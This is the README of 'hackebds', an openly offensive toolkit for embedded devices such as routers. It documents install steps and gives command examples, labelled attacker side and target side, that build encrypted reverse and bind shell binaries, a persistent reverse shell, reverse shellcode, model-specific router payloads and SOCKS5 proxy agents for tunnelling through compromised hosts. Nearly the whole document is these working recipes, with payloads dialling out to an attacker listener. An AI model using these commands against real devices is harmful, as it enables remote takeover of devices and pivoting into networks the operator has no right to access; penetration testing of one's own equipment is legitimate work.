# hackebds

![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
[![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)
![PyPI - Downloads](https://img.shields.io/pypi/dm/hackebds)

:link:[中文 readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)

## Overview

`hackebds` is a toolkit for embedded-device payload generation, encrypted shell workflows, SOCKS5 proxy tunneling, and device information lookup.

The current branch uses a **pure ELF workflow** for encrypted shell and proxy features:

- `reverse_shell_file` + `encrypted_shell_server` / `reverse_shell_server`
- `bind_shell` + `bind_shell_client`
- `reverse_proxy_file` + `reverse_proxy_server`
- `forward_proxy_file`

## What Changed In The New Version

- Added encrypted reverse shell and encrypted bind shell for the supported architectures in the current tree
- Added `encrypted_shell_server` / `reverse_shell_server` ELF listener so encrypted reverse shells can be received without Python runtime handlers
- Added `bind_shell_client` ELF connector for `bind_shell`
- Added reverse SOCKS5 proxy and forward SOCKS5 proxy ELF workflows
- Added `aes` and `chacha20` cipher choices for encrypted shell/proxy traffic
- Added `-bind_ip` for listener-side ELF binaries such as `bind_shell`, `encrypted_shell_server`, `reverse_proxy_server`, and `forward_proxy_file`
- Kept `reverse_shell_file` and `reverse_proxy_file` as dial-out payloads: they use `-reverse_ip` and do not bind a local listener IP

## Install

```bash
python3 -m pip install -U hackebds
```

Local development install:

```bash
git clone https://github.com/doudoudedi/hackEmbedded
cd hackEmbedded
python3 -m pip install -e .
```

## Build On Another Machine

If you rebuild release wheels on another host, use the source zip and `build_release.py`.

```bash
unzip hackebds-0.4.3-source-for-x86-build.zip
cd hackebds-0.4.0.backup-20260411T142751Z
python3 -m pip install -U pip setuptools wheel cython
python3 build_release.py --plat manylinux2014_x86_64
```

## Required Binutils

Install target-arch binutils before generating non-native ELF files.

```bash
sudo apt install binutils-aarch64-linux-gnu
sudo apt install binutils-arm-linux-gnueabi
sudo apt install binutils-mips-linux-gnu
sudo apt install binutils-mipsel-linux-gnu
sudo apt install binutils-mips64-linux-gnuabi64
sudo apt install binutils-mips64el-linux-gnuabi64
sudo apt install binutils-powerpc-linux-gnu
sudo apt install binutils-riscv64-linux-gnu
```

macOS users can use pwntools binutils:

```bash
brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
```

## Usage Examples

### 1. Encrypted Reverse Shell

Attacker side:

```bash
hackebds -arch x64 -res encrypted_shell_server \
  -reverse_port 4444 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_server.elf

chmod +x reverse_server.elf
./reverse_server.elf
```

Target side:

```bash
hackebds -arch mipsel -res reverse_shell_file \
  -reverse_ip 192.168.56.1 -reverse_port 4444 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_payload.elf

chmod +x reverse_payload.elf
./reverse_payload.elf
```

Notes:

- `reverse_shell_file` does not support `-bind_ip`
- `encrypted_shell_server` supports `-bind_ip`
- change `-cipher chacha20` to `-cipher aes` to use AES

### 2. Encrypted Bind Shell

Target side:

```bash
hackebds -arch aarch64 -res bind_shell \
  -bind_port 5555 \
  -bind_ip 192.168.56.20 \
  -passwd "s3cr3t" \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename bind_shell.elf

chmod +x bind_shell.elf
./bind_shell.elf
```

Attacker side:

```bash
hackebds -arch x64 -res bind_shell_client \
  -reverse_ip 192.168.56.20 -reverse_port 5555 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename bind_client.elf

chmod +x bind_client.elf
./bind_client.elf
```

Then enter:

```text
s3cr3t
id
uname -a
exit
```

### 3. Persistent Reverse Shell

Listener:

```bash
hackebds -arch x64 -res encrypted_shell_server --power \
  -reverse_port 4444 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename power_server.elf

./power_server.elf
```

Payload:

```bash
hackebds -arch armelv7 -res reverse_shell_file --power -sleep 10 \
  -reverse_ip 192.168.56.1 -reverse_port 4444 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename power_payload.elf
```

### 4. Encrypted Reverse SOCKS5 Proxy

Server:

```bash
hackebds -arch x64 -res reverse_proxy_server \
  -agent_port 7000 -socks_port 1080 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_proxy_server.elf

chmod +x reverse_proxy_server.elf
./reverse_proxy_server.elf
```

Agent:

```bash
hackebds -arch mips64el -res reverse_proxy_file \
  -reverse_ip 192.168.56.1 -reverse_port 7000 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_proxy_agent.elf

chmod +x reverse_proxy_agent.elf
./reverse_proxy_agent.elf
```

Test:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://example.com/
```

Auth-enabled server:

```bash
hackebds -arch x64 -res reverse_proxy_server \
  -agent_port 7000 -socks_port 1080 \
  -bind_ip 192.168.56.1 \
  -socks_auth user:pass \
  -cipher aes -encrypt_key "demo-key" \
  -filename reverse_proxy_server_auth.elf
```

UDP note:

- reverse SOCKS5 proxy has UDP support on the implemented non-SPARC proxy paths
- `sparc` / `sparc64` should not be treated as UDP-supported

### 5. Forward SOCKS5 Proxy

```bash
hackebds -arch x64 -res forward_proxy_file \
  -listen_port 1081 \
  -bind_ip 192.168.56.1 \
  -filename forward_proxy.elf

chmod +x forward_proxy.elf
./forward_proxy.elf
```

Test:

```bash
curl --socks5-hostname 127.0.0.1:1081 http://example.com/
```

### 6. Reverse Shellcode

```bash
hackebds -arch armelv7 -res reverse_shellcode \
  -reverse_ip 192.168.56.1 -reverse_port 4444
```

### 7. Use `-model`

```bash
hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 \
  -model DIR-816 -res reverse_shell_file
```

### 8. Use `--mcpu`

```bash
hackebds -mcpu mips32r2 -li -arch mipsel \
  -reverse_ip 127.0.0.1 -reverse_port 9999 \
  -res reverse_shell_file
```

### 9. Use `--firmware`

```bash
hackebds --firmware ./firmware.bin
```

## Notes

- `-bind_ip` is for listener-side ELF files only
- `reverse_shell_file` and `reverse_proxy_file` are dial-out payloads and do not bind a local listener IP
- `reverse_proxy_server` and `forward_proxy_file` support `-bind_ip`
- encrypted shell/proxy examples work with both `chacha20` and `aes`, as long as both sides match
